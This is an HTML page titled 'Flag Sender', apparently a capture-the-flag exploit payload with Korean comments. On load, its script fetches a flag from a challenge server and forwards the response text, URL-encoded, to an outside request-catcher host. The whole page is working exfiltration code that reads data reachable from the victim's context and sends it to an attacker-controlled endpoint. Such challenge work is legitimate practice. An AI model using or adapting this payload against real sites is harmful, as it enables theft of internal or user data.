<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Sender</title>
</head>
<body>
    <h1>Flag Sender3</h1>
    <script>
        const sendFlag = async () => {
            const requestUrl = 'http://war.sschall.xyz:60001/flag';

            try {
                const response = await fetch(requestUrl);
                
                if (response.ok) {
                    const responseText = await response.text();

                    console.log(`Requesting: ${requestUrl}`); // 요청 로그
                    console.log(`Response: ${responseText}`); // 응답 로그

                    // 최종 요청 보내기 (응답 text를 파라미터로 사용)
                    const finalRequestUrl = `https://ioegaam.request.dreamhack.games?flag=${encodeURIComponent(responseText)}`;
                    fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄

                    console.log('Final FLAG sent:', responseText);
                } else {
                    console.error('Request failed:', response.statusText);
                }
            } catch (error) {
                console.error('Network error:', error);
            }
        };

        sendFlag();
    </script>
</body>
</html>
